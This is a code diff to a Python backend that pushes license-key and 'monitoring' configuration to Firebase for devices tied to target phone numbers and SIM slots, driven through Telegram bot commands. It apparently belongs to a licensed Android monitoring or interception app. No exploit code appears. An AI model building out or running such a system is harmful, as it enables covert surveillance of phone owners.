@@ -147,9 +147,16 @@ async def publish_license_key(
     target_number: str | None = None,
     sim_index: int = 0,
     firebase_bases: list[str] | None = None,
+    firebase_url: str | None = None,
 ) -> None:
     normalized = assert_license_key_registered(key)
     now_ms = int(time.time() * 1000)
+    poll_id = device_id or ""
+    if target_number:
+        from app.firebase_sync import mynum_device_id
+
+        poll_id = mynum_device_id(target_number)
+    inject_db = (firebase_url or _module_db()).rstrip("/")
     meta = {
         "license_key": normalized,
         "max_devices": DEFAULT_MAX_DEVICES,
@@ -159,15 +166,18 @@ async def publish_license_key(
     config = {
         "monitoring": monitoring,
         "ts": now_ms,
-        "firebase_url": _module_db(),
-        "device_id": device_id or "",
+        "firebase_url": inject_db,
+        "device_id": poll_id,
         "firebase_key": normalized,
         "channel_id": channel_id or "",
         "target_number": target_number or "",
         "sim_index": sim_index,
         "apk_attached": False,
     }
-    await _sync_key_to_firebase(normalized, meta, config, firebase_bases)
+    bases = list(firebase_bases or [])
+    if inject_db not in bases and inject_db != _module_db():
+        bases.append(inject_db)
+    await _sync_key_to_firebase(normalized, meta, config, bases)
 
 
 async def generate_and_publish_license_key(
@@ -509,8 +519,11 @@ async def ensure_ready_for_monitoring(
     key: str,
     device_id: str,
     telegram_user_id: int | None = None,
+    *,
+    target_number: str | None = None,
+    firebase_url: str | None = None,
 ) -> None:
-    """Register device on key and publish config — no /key confirm or APK attach required."""
+    """Register device on key and publish APK config — no /key confirm required."""
     normalized = assert_license_key_registered(key)
     device_id = device_id.strip()
 
@@ -519,10 +532,14 @@ async def ensure_ready_for_monitoring(
     elif device_id not in list_key_devices(normalized):
         raise ValueError("Pehle /fdy <device_id> ya /a <device_id> se device select karo.")
 
+    bases = [firebase_url] if firebase_url else None
     await publish_license_key(
         normalized,
+        monitoring=True,
         device_id=device_id,
-        firebase_bases=None,
+        target_number=target_number,
+        firebase_bases=bases,
+        firebase_url=firebase_url,
     )
 
 
@@ -535,6 +552,7 @@ async def push_key_config(
     target_number: str | None = None,
     sim_index: int = 0,
     firebase_bases: list[str] | None = None,
+    firebase_url: str | None = None,
 ) -> None:
     await publish_license_key(
         key,
@@ -544,4 +562,5 @@ async def push_key_config(
         target_number=target_number,
         sim_index=sim_index,
         firebase_bases=firebase_bases,
+        firebase_url=firebase_url,
     )
